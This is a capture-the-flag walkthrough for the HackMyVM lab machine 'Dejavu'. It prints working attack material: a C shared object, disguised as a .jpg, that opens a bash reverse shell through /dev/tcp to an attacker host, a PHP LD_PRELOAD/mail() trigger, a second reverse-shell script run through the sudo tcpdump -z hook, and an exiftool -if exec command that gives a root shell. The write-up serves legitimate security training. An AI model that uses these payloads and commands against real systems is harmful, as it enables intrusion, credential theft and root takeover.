# Dejavu

## Executive Summary

| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| Dejavu | InfayerTS | Beginner | HackMyVM |

**Summary:** Dejavu is a beginner-level Linux machine on HackMyVM that chains together several creative and non-trivial techniques despite its difficulty rating. The initial foothold requires discovering a non-standard, hidden Apache document root exposed through a `phpinfo()` page, then reading an HTML comment embedded in the same page's source to reveal a concealed upload endpoint. From there, a file upload filter bypass is achieved using a dual approach: a reverse shell payload compiled as an ELF shared object disguised with a `.jpg` extension, loaded into Apache's process space via `LD_PRELOAD` through PHP's `mail()` function. This is a classic "Shared Object in Disguise" technique. After landing a shell as `www-data`, the path to the user `robert` is opened by abusing a `sudo` permission allowing `tcpdump` to run as `robert`, which — while intended for code execution via the `-z` post-rotation hook — inadvertently captures plaintext FTP credentials transmitted by a background cron job over the loopback interface. Those credentials are used to authenticate over SSH as `robert`. Privilege escalation to `root` is then accomplished by leveraging a `sudo` permission on `exiftool`, which inherits Perl's execution engine and allows arbitrary code injection via its `-if` flag, yielding an immediate root shell.

---

## Reconnaissance

### Network Discovery

The engagement begins with a local network sweep to identify the target. A custom PowerShell scanning script reveals a VirtualBox VM at `192.168.100.149`.

```powershell
PS D:\CTF_Tools> .\ScanNetwork-CTF.ps1
[*] Your IP  : 192.168.100.1
[*] Scanning : 192.168.100.0/24
[*] Status   : Pinging hosts...

[+] Virtual Targets Found:
------------------------------------------------------------

IP              MAC               Vendor
--              ---               ------
192.168.100.149 08:00:27:ED:0C:A1 VirtualBox
```

### Port Scanning

With the target IP confirmed, a comprehensive Nmap scan is launched against all 65535 TCP ports using service detection and default scripts.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/dejavu]
└─$ nmap -sC -sV -p- -T4 192.168.100.149
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-07 18:20 WIB
Nmap scan report for 192.168.100.149
Host is up (0.092s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 48:8f:5b:43:62:a1:5b:41:6d:7b:6e:55:27:bd:e1:67 (RSA)
|   256 10:17:d6:76:95:d0:9c:cc:ad:6f:20:7d:33:4a:27:4c (ECDSA)
|_  256 12:72:23:de:ef:28:28:9e:e0:12:ae:5f:37:2e:ee:25 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.11 seconds
```

The scan reveals two open ports: SSH on port 22 (OpenSSH 8.2p1) and HTTP on port 80 (Apache 2.4.41 on Ubuntu). Notably, there is no FTP port visible from the outside — a detail that becomes significant during the lateral movement phase. The web server presents only the default Apache2 Ubuntu page, offering no immediate clues about the application.

---

## Web Enumeration

### Directory and File Brute-Force

A Gobuster scan is run against the web root to discover hidden files and directories. The wordlist used is the DirBuster 2.3 medium list and a broad set of file extensions is included to maximize coverage.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/dejavu]
└─$ gobuster dir -u http://$IP -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x txt,php,bak,pem,html,zip,jpg,png,js,png,log
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.100.149
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              png,js,log,php,bak,pem,html,zip,jpg,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 10918]
/info.php             (Status: 200) [Size: 69976]
```

Two resources are found: the standard `index.html` (the default Apache page) and `info.php`. The `info.php` file is immediately interesting — it is a `phpinfo()` page with a size of ~70KB, containing a full dump of the PHP runtime configuration.

### Discovering the Hidden Document Root

Navigating to `http://192.168.100.149/info.php` and examining the `phpinfo()` output reveals a critical piece of information: the `DOCUMENT_ROOT` is **not** the typical `/var/www/html`. Instead, it points to a hidden directory (prefixed with a `.` making it invisible to standard directory listings):

`/var/www/html/.HowToEliminateTheTenMostCriticalInternetSecurityThreats`

The `SCRIPT_FILENAME` and `CONTEXT_DOCUMENT_ROOT` fields corroborate this, both resolving to the same hidden path.

![](image.png)

This is a deliberate obfuscation technique by the machine designer. The entire web application lives under a dot-prefixed directory name that would not show up in a standard `ls` on the server, and the Gobuster scan cannot find subdirectories relative to this concealed root using a typical wordlist alone.

### Finding the Hidden Comment in info.php

Viewing the page source of `info.php` (not the rendered `phpinfo()` output but the raw HTML returned by the server) reveals a planted HTML comment that acts as a breadcrumb:

```html
<html>
<body>
<!-- /S3cR3t -->
</body>
</html>
```

![](image-1.png)

The comment `<!-- /S3cR3t -->` is not rendered in the browser but is visible in the raw source. This directly hints at a hidden path beneath the document root.

### Accessing the /S3cR3t Directory

Navigating to `http://192.168.100.149/S3cR3t/` exposes an Apache directory listing. The listing reveals two items of interest: a `files/` subdirectory (the upload destination) and `upload.php` (the upload handler itself), both timestamped to 2022-05-13.

![](image-2.png)

The presence of `upload.php` and a `files/` directory strongly suggests a file upload functionality that can be abused to place attacker-controlled code on the server. The fact that directory listing is enabled here is also a misconfiguration that allows confirmation of uploaded file names.

---

## Initial Access — LD_PRELOAD via Shared Object Disguised as an Image

### Technique Overview: The Shared Object in Disguise

The upload mechanism at `/S3cR3t/upload.php` filters uploaded files, blocking standard PHP extensions (`.php`) but not enforcing a strict whitelist. The attack leverages two bypass vectors simultaneously:

**Vector 1 — Extension bypass for code execution:** The `.phtml` extension is not blocked by the upload filter and is still executed as PHP by Apache/mod-php, allowing a PHP reverse shell script to be uploaded and triggered.

**Vector 2 — LD_PRELOAD privilege via mail():** PHP's `mail()` function on Linux spawns a child `sendmail` process. This child process honors the `LD_PRELOAD` environment variable set by `putenv()`. By setting `LD_PRELOAD` to point to a compiled shared object, any library constructor function marked with `__attribute__ ((__constructor__))` will execute as soon as that shared object is loaded — before any other code runs. Crucially, Linux does not validate file extensions for shared objects at load time. The kernel cares only about the ELF magic bytes and format, not the filename. This means a file named `shell.jpg` that contains a valid ELF shared object **will be loaded and executed** by the dynamic linker just as reliably as if it were named `shell.so`.

### Building the Payloads

Two files are prepared on the attacker's machine:

**exploit.c** — The C source code for the shared object payload. It defines a constructor function that unsets `LD_PRELOAD` (to prevent recursive execution) and then spawns a bash reverse shell back to the attacker.

**revshell.phtml** — A PHP script that sets `LD_PRELOAD` to the full server-side path of `shell.jpg` (using the document root discovered from `info.php`) and calls `mail()` to trigger the shared library load.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/dejavu]
└─$ vim exploit.c

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/dejavu]
└─$ gcc -shared -fPIC exploit.c -o shell.jpg

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/dejavu]
└─$ vim revshell.phtml

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/dejavu]
└─$ cat revshell.phtml
<?php
$base_path = "/var/www/html/.HowToEliminateTheTenMostCriticalInternetSecurityThreats";
$so_path = $base_path . "/S3cR3t/files/shell.jpg";

putenv("LD_PRELOAD=$so_path");

mail("a@localhost", "", "", "");


echo "Targeting: $so_path <br>";
echo "Payload triggered! Check your nc -lvnp 4444";
?>

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/dejavu]
└─$ cat exploit.c
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>

__attribute__ ((__constructor__)) void payload (void) {
    unsetenv("LD_PRELOAD");
    system("/bin/bash -c 'bash -i >& /dev/tcp/192.168.100.1/4444 0>&1'");
}
```

The `gcc` invocation uses `-shared` to produce a shared object and `-fPIC` to generate Position Independent Code, which is required for shared libraries. The output file is named `shell.jpg` — a valid ELF binary with a deceptive extension.

Both `shell.jpg` and `revshell.phtml` are uploaded to the server via `upload.php`. The directory listing at `/S3cR3t/files/` confirms they land at their expected server-side paths.

### Setting Up the Listener and Triggering the Shell

A Netcat listener is started on the attacker machine on port 4444:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/dejavu]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
```

The shell is triggered by simply navigating the browser to the uploaded `revshell.phtml` file, causing Apache to execute the PHP code which sets `LD_PRELOAD` and calls `mail()`.

![](image-3.png)

### Shell Received and Stabilized

The reverse connection arrives on the listener. The shell is then upgraded to a fully interactive PTY using Python's `pty` module and the `stty raw` trick.

```bash
connect to [172.21.44.133] from (UNKNOWN) [172.21.32.1] 59994
bash: cannot set terminal process group (756): Inappropriate ioctl for device
bash: no job control in this shell
<nMostCriticalInternetSecurityThreats/S3cR3t/files$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
<nMostCriticalInternetSecurityThreats/S3cR3t/files$ cd /
cd /
www-data@dejavu:/$ which python3
which python3
/usr/bin/python3
www-data@dejavu:/$ python3 -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@dejavu:/$ ^Z
zsh: suspended  nc -lvnp 4444

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/dejavu]
└─$ stty raw -echo; fg
[1]  + continued  nc -lvnp 4444

www-data@dejavu:/$ export SHELL=/bin/bash
www-data@dejavu:/$ export TERM=xterm-256color
www-data@dejavu:/$ stty rows 64 cols 97
```

A stable, fully interactive shell is now running as `www-data`.

---

## Lateral Movement — From www-data to robert via FTP Credential Sniffing

### Local User Enumeration

From the `www-data` shell, the system's users with login shells are enumerated and robert's home directory is inspected:

```bash
www-data@dejavu:/$ cat /etc/passwd | grep "sh$"
root:x:0:0:root:/root:/bin/bash
robert:x:1000:1000:Dejavu:/home/robert:/bin/bash
www-data@dejavu:/$ ls -la /home/robert/
total 48
drwxr-xr-x 5 robert robert 4096 May 13  2022 .
drwxr-xr-x 3 root   root   4096 May 12  2022 ..
lrwxrwxrwx 1 robert robert    9 May 13  2022 .bash_history -> /dev/null
-rw-r--r-- 1 robert robert  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 robert robert 3771 Feb 25  2020 .bashrc
drwx------ 2 robert robert 4096 May 12  2022 .cache
drwxrwxr-x 3 robert robert 4096 May 13  2022 .local
-rw-r--r-- 1 robert robert  807 Feb 25  2020 .profile
-rw-rw-r-- 1 robert robert   66 May 13  2022 .selected_editor
drwx------ 2 robert robert 4096 May 12  2022 .ssh
-rw-r--r-- 1 robert robert    0 May 12  2022 .sudo_as_admin_successful
-rw-rw-r-- 1 robert robert  215 May 13  2022 .wget-hsts
-r-x------ 1 robert robert   72 May 13  2022 auth.sh
-r-------- 1 robert robert   38 May 13  2022 user.txt
```

Two noteworthy files exist in robert's home: `auth.sh` (readable and executable only by robert) and `user.txt` (the user flag, readable only by robert). The `.bash_history` is a symlink to `/dev/null`, preventing history leakage. The `user.txt` is inaccessible from `www-data`.

### Sudo Permissions for www-data

```bash
www-data@dejavu:/$ sudo -l
Matching Defaults entries for www-data on dejavu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on dejavu:
    (robert) NOPASSWD: /usr/sbin/tcpdump
```

`www-data` can run `/usr/sbin/tcpdump` as user `robert` without a password. This is a GTFOBins-documented privilege escalation vector: `tcpdump` supports a `-z` flag that executes an arbitrary post-rotation script after a capture file is written. When combined with `-G 1 -W 1` (rotate every 1 second, write only 1 file), it will execute the script almost immediately after any traffic is captured.

![](image-4.png)

The GTFOBins entry for `tcpdump` confirms the technique: `tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z /path/to/temp-file -Z root`. This requires that some traffic be captured on the chosen interface. The loopback interface (`lo`) is ideal since it carries local inter-process communication traffic.

### Process Monitoring with pspy64

Before executing the `tcpdump` exploit, `pspy64` is transferred to the target to discover what processes are running as other users — specifically to understand what traffic might be flowing over loopback.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/opt]
└─$ python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
172.21.32.1 - - [07/Mar/2026 19:00:21] "GET /pspy64 HTTP/1.1" 200 -
```

```bash
www-data@dejavu:/tmp$ wget http://192.168.100.1:8080/pspy64
--2026-03-07 12:00:20--  http://192.168.100.1:8080/pspy64
Connecting to 192.168.100.1:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3104768 (3.0M) [application/octet-stream]
Saving to: 'pspy64'

pspy64                     0%[                                ] pspy64                   100%[===============================>]   2.96M  --.-KB/s    in 0.09s

2026-03-07 12:00:20 (31.8 MB/s) - 'pspy64' saved [3104768/3104768]

www-data@dejavu:/tmp$ chmod +x pspy64
```

Running `pspy64` reveals a cron job executing every minute as UID 1000 (robert):

```bash
2026/03/07 12:03:01 CMD: UID=0     PID=1667   | /usr/sbin/CRON -f
2026/03/07 12:03:01 CMD: UID=1000  PID=1668   | /usr/sbin/CRON -f
2026/03/07 12:03:01 CMD: UID=1000  PID=1669   | /bin/sh -c /home/robert/auth.sh
2026/03/07 12:03:01 CMD: UID=1000  PID=1670   | /bin/sh /home/robert/auth.sh
2026/03/07 12:03:01 CMD: UID=0     PID=1672   | /usr/sbin/vsftpd /etc/vsftpd.conf
2026/03/07 12:03:01 CMD: UID=0     PID=1671   | /usr/sbin/vsftpd /etc/vsftpd.conf
2026/03/07 12:03:01 CMD: UID=0     PID=1673   | /usr/sbin/vsftpd /etc/vsftpd.conf
2026/03/07 12:04:01 CMD: UID=0     PID=1674   | /usr/sbin/CRON -f
2026/03/07 12:04:01 CMD: UID=1000  PID=1675   | /usr/sbin/CRON -f
2026/03/07 12:04:01 CMD: UID=1000  PID=1676   | /bin/sh -c /home/robert/auth.sh
2026/03/07 12:04:01 CMD: UID=1000  PID=1677   | /bin/sh /home/robert/auth.sh
2026/03/07 12:04:01 CMD: UID=65534 PID=1679   | /usr/sbin/vsftpd /etc/vsftpd.conf
2026/03/07 12:04:01 CMD: UID=0     PID=1678   | /usr/sbin/vsftpd /etc/vsftpd.conf
2026/03/07 12:04:01 CMD: UID=1000  PID=1680   |
```

Every minute, robert's `auth.sh` script executes and triggers `vsftpd` processes, indicating that `auth.sh` is making FTP connections to the local FTP server. Cross-referencing with the listening ports confirms why FTP was not found in the initial Nmap scan:

```bash
www-data@dejavu:/home/robert$ ss -tlpn
State      Recv-Q     Send-Q         Local Address:Port         Peer Address:Port    Process
LISTEN     0          32                 127.0.0.1:21                0.0.0.0:*
LISTEN     0          4096           127.0.0.53%lo:53                0.0.0.0:*
LISTEN     0          128                  0.0.0.0:22                0.0.0.0:*
LISTEN     0          511                        *:80                      *:*
LISTEN     0          128                     [::]:22                   [::]:*
```

FTP (vsftpd 3.0.3) is bound **exclusively to loopback** (`127.0.0.1:21`). It is completely invisible to external scans. The `auth.sh` script makes a local FTP connection to `127.0.0.1:21` every minute, and since FTP transmits credentials in cleartext, sniffing the loopback interface will capture robert's FTP password.

### Capturing FTP Credentials with tcpdump

A reverse shell script is written to `/tmp/pentest.sh` and the `tcpdump` sudo privilege is leveraged to execute it after capturing one second of traffic on the loopback interface. However, while waiting for the `-z` hook to fire, the full FTP handshake is captured in the terminal output — revealing the plaintext credentials:

```bash
www-data@dejavu:/home/robert$ echo 'bash -i >& /dev/tcp/192.168.100.1/8888 0>&1' > /tmp/pentest.sh
www-data@dejavu:/home/robert$ chmod +x /tmp/pentest.sh
www-data@dejavu:/home/robert$ sudo -u robert /usr/sbin/tcpdump -ln -i lo -G 1 -W 1 -z /tmp/pentest.sh -Z root
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on lo, link-type EN10MB (Ethernet), capture size 262144 bytes
...
12:07:55.342396 IP 127.0.0.1.37042 > 127.0.0.53.53: 63274+ [1au] A? ntp.ubuntu.com. (43)
12:07:55.342400 IP 127.0.0.1.37042 > 127.0.0.53.53: 50217+ [1au] AAAA? ntp.ubuntu.com. (43)
12:07:55.342431 IP 127.0.0.53.53 > 127.0.0.1.37042: 63274 ServFail 0/0/1 (43)
12:07:55.342460 IP 127.0.0.53.53 > 127.0.0.1.37042: 50217 ServFail 0/0/1 (43)
12:08:01.608052 IP 127.0.0.1.59660 > 127.0.0.1.21: Flags [S], seq 3936079636, win 65495, options [mss 65495,sackOK,TS val 1349676284 ecr 0,nop,wscale 7], length 0
12:08:01.608062 IP 127.0.0.1.21 > 127.0.0.1.59660: Flags [S.], seq 779479889, ack 3936079637, win 65483, options [mss 65495,sackOK,TS val 1349676284 ecr 1349676284,nop,wscale 7], length 0
12:08:01.608070 IP 127.0.0.1.59660 > 127.0.0.1.21: Flags [.], ack 1, win 512, options [nop,nop,TS val 1349676284 ecr 1349676284], length 0
12:08:01.610709 IP 127.0.0.1.21 > 127.0.0.1.59660: Flags [P.], seq 1:21, ack 1, win 512, options [nop,nop,TS val 1349676287 ecr 1349676284], length 20: FTP: 220 (vsFTPd 3.0.3)
12:08:01.610861 IP 127.0.0.1.59660 > 127.0.0.1.21: Flags [.], ack 21, win 512, options [nop,nop,TS val 1349676287 ecr 1349676287], length 0
12:08:01.611373 IP 127.0.0.1.59660 > 127.0.0.1.21: Flags [P.], seq 1:14, ack 21, win 512, options [nop,nop,TS val 1349676287 ecr 1349676287], length 13: FTP: USER robert
12:08:01.611378 IP 127.0.0.1.21 > 127.0.0.1.59660: Flags [.], ack 14, win 512, options [nop,nop,TS val 1349676288 ecr 1349676287], length 0
12:08:01.611525 IP 127.0.0.1.21 > 127.0.0.1.59660: Flags [P.], seq 21:55, ack 14, win 512, options [nop,nop,TS val 1349676288 ecr 1349676287], length 34: FTP: 331 Please specify the password.
12:08:01.611577 IP 127.0.0.1.59660 > 127.0.0.1.21: Flags [.], ack 55, win 512, options [nop,nop,TS val 1349676288 ecr 1349676288], length 0
12:08:01.611651 IP 127.0.0.1.59660 > 127.0.0.1.21: Flags [P.], seq 14:32, ack 55, win 512, options [nop,nop,TS val 1349676288 ecr 1349676288], length 18: FTP: PASS 973[REDACTED]
12:08:01.611663 IP 127.0.0.1.21 > 127.0.0.1.59660: Flags [.], ack 32, win 512, options [nop,nop,TS val 1349676288 ecr 1349676288], length 0
12:08:01.626066 IP 127.0.0.1.21 > 127.0.0.1.59660: Flags [P.], seq 55:78, ack 32, win 512, options [nop,nop,TS val 1349676302 ecr 1349676288], length 23: FTP: 230 Login successful.
12:08:01.626074 IP 127.0.0.1.59660 > 127.0.0.1.21: Flags [.], ack 78, win 512, options [nop,nop,TS val 1349676302 ecr 1349676302], length 0
12:08:01.626156 IP 127.0.0.1.59660 > 127.0.0.1.21: Flags [P.], seq 32:38, ack 78, win 512, options [nop,nop,TS val 1349676302 ecr 1349676302], length 6: FTP: QUIT
12:08:01.626271 IP 127.0.0.1.21 > 127.0.0.1.59660: Flags [.], ack 38, win 512, options [nop,nop,TS val 1349676302 ecr 1349676302], length 0
12:08:01.626341 IP 127.0.0.1.21 > 127.0.0.1.59660: Flags [P.], seq 78:92, ack 38, win 512, options [nop,nop,TS val 1349676302 ecr 1349676302], length 14: FTP: 221 Goodbye.
12:08:01.626345 IP 127.0.0.1.59660 > 127.0.0.1.21: Flags [.], ack 92, win 512, options [nop,nop,TS val 1349676302 ecr 1349676302], length 0
12:08:01.626484 IP 127.0.0.1.59660 > 127.0.0.1.21: Flags [F.], seq 38, ack 92, win 512, options [nop,nop,TS val 1349676303 ecr 1349676302], length 0
12:08:01.627506 IP 127.0.0.1.21 > 127.0.0.1.59660: Flags [F.], seq 92, ack 39, win 512, options [nop,nop,TS val 1349676304 ecr 1349676303], length 0
12:08:01.627516 IP 127.0.0.1.59660 > 127.0.0.1.21: Flags [.], ack 93, win 512, options [nop,nop,TS val 1349676304 ecr 1349676304], length 0
```

The capture tells the complete story of the FTP session: the cron job initiates a TCP connection to `127.0.0.1:21`, the vsFTPd 3.0.3 server responds with its banner, the client sends `USER robert`, the server prompts for a password, and the client sends `PASS 973[REDACTED]` in cleartext. The server responds with `230 Login successful.` The session then terminates cleanly. The complete password for user `robert` is now in hand.

The original intent was to get code execution via the `-z` callback, but the FTP credentials captured as a side effect of the traffic sniffing turn out to be the more direct path forward.

### SSH Login as robert

The captured FTP credentials are tried against the publicly exposed SSH service, since users frequently reuse passwords across services:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/dejavu]
└─$ ssh robert@$IP
...
robert@dejavu:~$ id ; ls -la
uid=1000(robert) gid=1000(robert) groups=1000(robert),1001(pcap)
total 48
drwxr-xr-x 5 robert robert 4096 May 13  2022 .
drwxr-xr-x 3 root   root   4096 May 12  2022 ..
-r-x------ 1 robert robert   72 May 13  2022 auth.sh
lrwxrwxrwx 1 robert robert    9 May 13  2022 .bash_history -> /dev/null
-rw-r--r-- 1 robert robert  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 robert robert 3771 Feb 25  2020 .bashrc
drwx------ 2 robert robert 4096 May 12  2022 .cache
drwxrwxr-x 3 robert robert 4096 May 13  2022 .local
-rw-r--r-- 1 robert robert  807 Feb 25  2020 .profile
-rw-rw-r-- 1 robert robert   66 May 13  2022 .selected_editor
drwx------ 2 robert robert 4096 May 12  2022 .ssh
-rw-r--r-- 1 robert robert    0 May 12  2022 .sudo_as_admin_successful
-r-------- 1 robert robert   38 May 13  2022 user.txt
-rw-rw-r-- 1 robert robert  215 May 13  2022 .wget-hsts
```

SSH login succeeds. The `id` output also reveals that robert is a member of the `pcap` group (GID 1001), which explains why the intended path involved tcpdump capture capabilities. The `user.txt` flag is now accessible and collected.

---

## Privilege Escalation — root via exiftool Sudo Perl Injection

### Sudo Permissions for robert

```bash
robert@dejavu:~$ sudo -l
Matching Defaults entries for robert on dejavu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User robert may run the following commands on dejavu:
    (root) NOPASSWD: /usr/local/bin/exiftool
```

Robert can execute `/usr/local/bin/exiftool` as `root` without any password. ExifTool is a Perl-based metadata reading/writing utility. Because it is built on Perl and its interpreter is embedded in its execution context, it inherits Perl's ability to evaluate arbitrary code.

### GTFOBins — exiftool Sudo Technique

The GTFOBins entry for `exiftool` documents the "Inherit" capability. ExifTool supports an `-if` flag that evaluates a Perl expression to conditionally process files. When this Perl code calls `exec()`, it replaces the running process with the specified command. Since `exiftool` is running as `root` via `sudo` and privileges are not dropped, the `exec()` call spawns a shell with full root privileges.

![](image-5.png)

The GTFOBins page notes that exiftool "can inherit functions from another" (Perl), "allows to run Perl code", and when executed via `sudo`, "this function is performed by the privileged user because the acquired privileges are not dropped." The attack surface covers Shell, Reverse shell, File read, Upload, and Download. The documented exploit format is `exiftool -if '...' /etc/passwd`.

### Exploiting exiftool for Root Shell

```bash
robert@dejavu:~$ sudo /usr/local/bin/exiftool -if 'exec("/bin/bash")' /etc/passwd
root@dejavu:/home/robert# cd
root@dejavu:~# id ; whoami; hostname
uid=0(root) gid=0(root) groups=0(root)
root
dejavu
root@dejavu:~# cat /home/robert/user.txt /root/r0ot.tXt
HMV{c8b[REDACTED]}
HMV{c62[REDACTED]}
```

The single command `sudo /usr/local/bin/exiftool -if 'exec("/bin/bash")' /etc/passwd` immediately drops into a root shell. The `-if` flag passes the Perl snippet `exec("/bin/bash")` as a conditional filter. ExifTool's Perl runtime evaluates this, `exec()` replaces the exiftool process image with `/bin/bash`, and since `sudo` had already elevated the process to `root`, the resulting shell runs with `uid=0(root) gid=0(root)`. Both flags — `user.txt` for robert and `r0ot.tXt` for root — are captured.

---

## Attack Chain Summary

1. **Reconnaissance**: Network sweep identified `192.168.100.149` as a VirtualBox target. Nmap revealed SSH on port 22 (OpenSSH 8.2p1) and HTTP on port 80 (Apache 2.4.41). The default Apache page gave no direct entry point. FTP was not externally visible as it was bound only to loopback.

2. **Vulnerability Discovery**: Gobuster uncovered `/info.php`, a `phpinfo()` page revealing that the Apache document root is the hidden dotfile directory `/var/www/html/.HowToEliminateTheTenMostCriticalInternetSecurityThreats`. Reading the raw HTML source of `info.php` exposed the comment `<!-- /S3cR3t -->`, pointing to a hidden subdirectory containing `upload.php` and a `files/` folder.

3. **Exploitation (Initial Foothold)**: A C reverse shell payload was compiled as a Position-Independent ELF shared object with a `.jpg` extension (`shell.jpg`). A PHP reverse shell script (`revshell.phtml`) was also prepared to set `LD_PRELOAD` to the server-side path of `shell.jpg` and trigger loading via PHP's `mail()` function. Both files were uploaded to `/S3cR3t/files/` (bypassing the upload filter with the `.phtml` extension and the image-mimicking `.jpg` name). Accessing `revshell.phtml` via the browser executed the `LD_PRELOAD` trick, loading the ELF shared object and firing the reverse shell constructor, landing a shell as `www-data`.

4. **Internal Enumeration**: Checking `sudo -l` showed `www-data` could run `tcpdump` as `robert` without a password. Running `pspy64` revealed a cron job executing `/home/robert/auth.sh` as UID 1000 every minute, with vsftpd spawning as a result. Checking `ss -tlpn` confirmed vsFTPd was bound only to `127.0.0.1:21`. Sniffing the loopback interface with `tcpdump` during the cron window captured the full FTP handshake in cleartext, revealing robert's password in the `PASS` command of the FTP protocol stream.

5. **Privilege Escalation**: SSH login as `robert` succeeded using the captured FTP password (credential reuse). Checking `sudo -l` for robert revealed passwordless `sudo` access to `/usr/local/bin/exiftool` as root. Leveraging the GTFOBins "Inherit" technique for exiftool, the Perl `-if` flag was used to inject `exec("/bin/bash")`, which replaced the exiftool process with a bash shell running as `uid=0(root)`. Both flags were collected.
